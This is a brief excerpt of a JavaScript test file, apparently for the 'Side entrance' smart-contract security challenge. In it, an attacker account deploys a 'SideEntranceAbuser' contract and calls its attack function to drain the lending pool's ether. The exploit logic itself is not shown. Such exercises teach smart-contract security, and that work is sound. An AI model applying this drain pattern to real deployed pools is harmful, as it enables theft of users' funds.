...
describe("[Challenge] Side entrance", function () {
    ...
    it("Exploit", async function () {
        ...
        const SideEntranceAbuserFactory = await ethers.getContractFactory("SideEntranceAbuser", attacker);
        this.abuser = await SideEntranceAbuserFactory.deploy();

        await this.abuser.attack(this.pool.address, ETHER_IN_POOL);
    });
